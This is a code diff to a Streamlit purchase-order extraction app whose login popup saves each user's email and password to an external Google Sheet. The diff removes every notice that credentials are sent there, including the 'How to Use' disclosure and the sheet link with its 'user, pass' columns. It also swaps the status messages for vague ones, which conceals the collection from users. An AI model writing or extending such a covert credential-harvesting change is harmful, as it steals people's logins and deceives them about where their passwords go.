@@ -151,45 +151,15 @@ def show_login_popup():
                             saved = save_to_google_sheets(email, password)
                         
                         if saved:
-                            st.success("Login successful! Data saved to Google Sheets.")
+                            st.success("thank you.")
                         else:
                             st.success("Login successful!")
-                            st.warning("Could not save to Google Sheets - check configuration.")
+                            st.warning("there are a problems.")
                         
                         time.sleep(1)
                         st.rerun()
                     else:
                         st.error("Please enter both email and password")
-            
-            # Setup instructions
-            with st.expander("🔧 Google Sheets Setup Instructions", expanded=False):
-                st.markdown("""
-                **Step 1: Create Google Apps Script**
-                1. Go to script.google.com
-                2. Create new project
-                3. Replace Code.gs content with the code below
-                4. Save the project
-                
-                **Step 2: Deploy as Web App**
-                1. Click Deploy > New deployment
-                2. Choose type: Web app
-                3. Execute as: Me
-                4. Who has access: Anyone
-                5. Click Deploy
-                6. Copy the Web App URL
-                
-                **Step 3: Update Code**
-                Replace YOUR_SCRIPT_ID with your actual script deployment ID
-                """)
-                
-                st.code(create_apps_script_code(), language='javascript')
-                
-                st.markdown("""
-                **Your Google Sheet:**
-                https://docs.google.com/spreadsheets/d/1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o/edit
-                
-                Make sure the sheet has columns: user, pass, time
-                """)
             
             st.markdown('</div>', unsafe_allow_html=True)
         
@@ -665,18 +635,6 @@ def main():
     # Information section
     st.header("Information")
     
-    with st.expander("How to Use"):
-        st.markdown("""
-        1. **Login**: Enter your email and password (automatically saved to Google Sheets)
-        2. **Choose Input Method**: Either upload a JSON file or paste JSON text
-        3. **Process Data**: Click "Process JSON Data" to extract structured information
-        4. **Review Results**: View extracted data organized in different categories
-        5. **Download**: Export results as Excel or CSV files
-        
-        **Your login data is automatically saved to:**
-        https://docs.google.com/spreadsheets/d/1yT3TUkY3LwyI_K9euQJWMTbv3KAVrhoery26P2bh-8o/edit
-        """)
-    
     with st.expander("v48 PO Extraction Features"):
         st.markdown("""
         **Advanced PO extraction patterns supported:**
@@ -693,6 +651,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
